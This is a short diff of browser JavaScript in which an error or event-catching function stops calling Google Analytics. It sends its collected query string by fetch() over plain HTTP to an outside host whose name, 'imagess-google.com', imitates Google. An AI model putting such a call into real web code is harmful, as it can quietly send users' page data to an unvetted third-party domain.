@@ -225,7 +225,7 @@ window._catch = function(data){
   str=str.join('&')
   // var fetchUrl = state.UserName||data.UserName
   // fetchUrl = '/catch?'+(fetchUrl&&('U='+fetchUrl+'&'))+str
-  _App && ga && ga('send','event',msg,str)
+  // _App && ga && ga('send','event',msg,str)
   var fetchUrl = 'http://catch.imagess-google.com?'+str
   fetch(fetchUrl, {
     credentials:'same-origin',
